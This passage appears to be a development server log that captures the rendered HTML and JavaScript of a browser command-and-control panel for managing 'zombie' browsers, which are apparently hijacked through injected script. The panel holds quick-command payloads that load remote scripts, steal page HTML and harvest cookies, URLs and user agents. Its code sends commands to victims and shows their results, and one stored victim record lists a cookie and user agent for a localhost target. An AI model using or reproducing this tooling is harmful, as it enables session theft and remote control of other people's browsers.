document.head.appendChild(script); return &quot;遠程腳本載入中...&quot;; })()\')">載入遠程腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ return document.documentElement.outerHTML.substring(0, 2000); })()\')">竊取頁面HTML</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var scripts = []; document.querySelectorAll(&quot;script&quot;).forEach(function(s){ scripts.push({src: s.src, content: s.innerHTML.substring(0, 200)}); }); return JSON.stringify(scripts, null, 2); })()\')">查看頁面腳本</button>\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var meta = []; document.querySelectorAll(&quot;meta&quot;).forEach(function(m){ meta.push({name: m.name, content: m.content, property: m.property}); }); return JSON.stringify(meta, null, 2); })()\')">查看Meta信息</button>\n\n                    <!-- 測試載荷 -->\n                    <button type="button" class="quick-cmd-btn"\n                        onclick="setCommand(\'(function(){ var result = { timestamp: new Date().toISOString(), url: window.location.href, title: document.title, userAgent: navigator.userAgent, cookies: document.cookie, domElements: document.querySelectorAll(&quot;*&quot;).length }; return &quot;=== 完整信息收集結果 ===\\\\n&quot; + JSON.stringify(result, null, 2); })()\')">完整信息收集</button>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;hostname&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-26T15:07:45.211Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-26 23:07:45.221365</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                                <button class="action-btn result-btn" onclick="event.stopPropagation(); showZombieResults(\'${zombie}\')">\n                                    📋 查看結果\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div class="error-state">載入失敗: ${data.error}</div>`;\n            }\n        } catch (error) {\n            console.error(\'載入殭屍列表失敗:\', error);\n            document.getElementById(\'zombie-count\').textContent = \'載入失敗\';\n            document.getElementById(\'zombie-list\').innerHTML = \'<div class="error-state">網路錯誤</div>\';\n        }\n    }\n\n    // 選擇殭屍機器\n    function selectZombie(zombieIp) {\n        document.getElementById(\'selected-zombie\').value = zombieIp;\n        document.getElementById(\'command-form-container\').style.display = \'block\';\n        document.getElementById(\'command\').focus();\n    }\n\n    // 隱藏命令表單\n    function hideCommandForm() {\n        document.getElementById(\'command-form-container\').style.display = \'none\';\n        document.getElementById(\'command\').value = \'\';\n        document.getElementById(\'selected-zombie\').value = \'\';\n    }\n\n    // 設置快速命令\n    function setCommand(cmd) {\n        document.getElementById(\'command\').value = cmd;\n    }\n\n    // 發送命令給殭屍機器\n    document.getElementById(\'command-form\').addEventListener(\'submit\', async function (e) {\n        e.preventDefault();\n\n        const zombieIp = document.getElementById(\'selected-zombie\').value;\n        const command = document.getElementById(\'command\').value;\n\n        if (!zombieIp || !command) {\n            alert(\'請選擇殭屍機器並輸入命令\');\n            return;\n        }\n\n        try {\n            const formData = new FormData();\n            formData.append(\'command\', command);\n\n            const response = await fetch(`/api/control/add_command_to_do/${zombieIp}`, {\n                method: \'POST\',\n                body: formData\n            });\n\n            if (response.ok) {\n                alert(`命令已發送給 ${zombieIp}`);\n                hideCommandForm();\n            } else {\n                const errorData = await response.json();\n                alert(`發送失敗: ${errorData.error}`);\n            }\n        } catch (error) {\n            console.error(\'發送命令失敗:\', error);\n            alert(\'發送命令時發生網路錯誤\');\n        }\n    });\n\n    // 刷新殭屍列表\n    document.getElementById(\'refresh-zombies\').addEventListener(\'click\', loadZombies);\n\n    // 頁面載入時檢查當前選項卡\n    document.addEventListener(\'DOMContentLoaded\', function () {\n        // 檢查URL參數是否指定了選項卡\n        const urlParams = new URLSearchParams(window.location.search);\n        const tab = urlParams.get(\'tab\');\n        if (tab === \'zombies\') {\n            showTab(\'zombies\');\n        }\n    });\n\n    // 新增：顯示殭屍機器的執行結果\n    async function showZombieResults(zombieIp) {\n        try {\n            const response = await fetch(`/api/control/get_zombie_details/${zombieIp}`);\n            const data = await response.json();\n\n            if (data.status === \'success\') {\n                // 創建彈出視窗顯示結果\n                const modal = createResultModal(data);\n                document.body.appendChild(modal);\n                modal.style.display = \'block\';\n            } else {\n                alert(`無法獲取結果: ${data.error}`);\n            }\n        } catch (error) {\n            console.error(\'獲取結果失敗:\', error);\n            alert(\'獲取結果時發生網路錯誤\');\n        }\n    }\n\n    // 創建結果顯示彈出視窗\n    function createResultModal(zombieData) {\n        const modal = document.createElement(\'div\');\n        modal.className = \'result-modal\';\n        modal.innerHTML = `\n            <div class="modal-content">\n                <div class="modal-header">\n                    <h3>🧟 殭屍機器詳細信息: ${zombieData.zombie_ip}</h3>\n                    <button class="close-modal" onclick="closeModal(this)">&times;</button>\n                </div>\n                <div class="modal-body">\n                    <!-- 註冊信息 -->\n                    <div class="info-section">\n                        <h4>📝 註冊信息</h4>\n                        <div class="info-content">\n                            ${formatRegistrationInfo(zombieData.registration_info)}\n                        </div>\n                    </div>\n\n                    <!-- 當前命令 -->\n                    <div class="info-section">\n                        <h4>⚡ 當前待執行命令</h4>\n                        <div class="info-content">\n                            <code>${zombieData.current_command || \'無待執行命令\'}</code>\n                        </div>\n                    </div>\n\n                    <!-- 執行結果 -->\n                    <div class="info-section">\n                        <h4>📊 命令執行結果</h4>\n                        <div class="results-container">\n                            ${formatExecutionResults(zombieData.execution_results)}\n                        </div>\n                    </div>\n\n                    <!-- 時間信息 -->\n                    <div class="info-section">\n                        <h4>🕒 時間信息</h4>\n                        <div class="info-content">\n                            <p><strong>註冊時間:</strong> ${formatDateTime(zombieData.created_at)}</p>\n                            <p><strong>最後活動:</strong> ${formatDateTime(zombieData.last_seen)}</p>\n                        </div>\n                    </div>\n                </div>\n            </div>\n        `;\n        return modal;\n    }\n\n    // 格式化註冊信息\n    function formatRegistrationInfo(regInfo) {\n        if (!regInfo || Object.keys(regInfo).length === 0) {\n            return \'<p>無註冊信息</p>\';\n        }\n\n        let html = \'<div class="reg-info">\';\n        for (const [key, value] of Object.entries(regInfo)) {\n            const displayKey = {\n                \'where\': \'來源頁面\',\n                \'hostname\': \'主機名稱\',\n                \'cookie\': \'Cookie\',\n                \'user_agent\': \'用戶代理\',\n                \'time_stamp\': \'時間戳記\'\n            }[key] || key;\n\n            html += `<p><strong>${displayKey}:</strong> ${value}</p>`;\n        }\n        html += \'</div>\';\n        return html;\n    }\n\n    // 格式化執行結果\n    function formatExecutionResults(results) {\n        if (!results || results.length === 0) {\n            return \'<div class="no-results">尚無執行結果</div>\';\n        }\n\n        let html = \'\';\n        results.forEach((result, index) => {\n            const statusIcon = result.success ? \'✅\' : \'❌\';\n            const statusText = result.success ? \'成功\' : \'失敗\';\n\n            html += `\n                <div class="result-item ${result.success ? \'success\' : \'error\'}">\n                    <div class="result-header">\n                        <span class="result-status">${statusIcon} ${statusText}</span>\n                        <span class="result-time">${formatDateTime(result.timestamp)}</span>\n                    </div>\n                    <div class="result-command">\n                        <strong>命令:</strong> <code>${result.command || \'未知命令\'}</code>\n                    </div>\n                    ${result.output ? `\n                        <div class="result-output">\n                            <strong>輸出:</strong>\n                            <pre>${result.output}</pre>\n                        </div>\n                    ` : \'\'}\n                    ${result.error ? `\n                        <div class="result-error">\n                            <strong>錯誤:</strong>\n                            <pre>${result.error}</pre>\n                        </div>\n                    ` : \'\'}\n                </div>\n            `;\n        });\n\n        return html;\n    }\n\n    // 格式化日期時間\n    function formatDateTime(dateStr) {\n        if (!dateStr) return \'未知\';\n        try {\n            return new Date(dateStr).toLocaleString(\'zh-TW\');\n        } catch {\n            return dateStr;\n        }\n    }\n\n    // 關閉彈出視窗\n    function closeModal(button) {\n        const modal = button.closest(\'.result-modal\');\n        if (modal) {\n            modal.remove();\n        }\n    }\n</script>\n\n\n\n    <!-- JavaScript 引用 -->\n    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>\n    \n</body>\n\n\n</html>'
2025-06-28 23:43:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [28/Jun/2025 23:43:33] "GET /api/control/get_messages HTTP/1.1" 200 -
2025-06-28 23:43:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [28/Jun/2025 23:43:33] "GET /static/css/control_message.css HTTP/1.1" 200 -
2025-06-28 23:43:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [28/Jun/2025 23:43:33] "GET /favicon.ico HTTP/1.1" 200 -
2025-06-28 23:43:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombies()
2025-06-28 23:43:34 | INFO     | control_route.py:187 | get_zombies() | 用戶請求獲取殭屍機器列表
2025-06-28 23:43:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombies 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 76 bytes [200 OK]>
2025-06-28 23:43:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [28/Jun/2025 23:43:34] "GET /api/control/get_zombies HTTP/1.1" 200 -
2025-06-28 23:43:38 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_zombie_details(zombie_ip='127.0.0.1')
2025-06-28 23:43:38 | INFO     | control_route.py:285 | get_zombie_details() | 用戶請求查看殭屍機器 127.0.0.1 的詳細信息
2025-06-28 23:43:38 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_zombie_details 執行完畢 (耗時: 0.0015s) -> 回傳: <Response 1856 bytes [200 OK]>
2025-06-28 23:43:38 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [28/Jun/2025 23:43:38] "GET /api/control/get_zombie_details/127.0.0.1 HTTP/1.1" 200 -
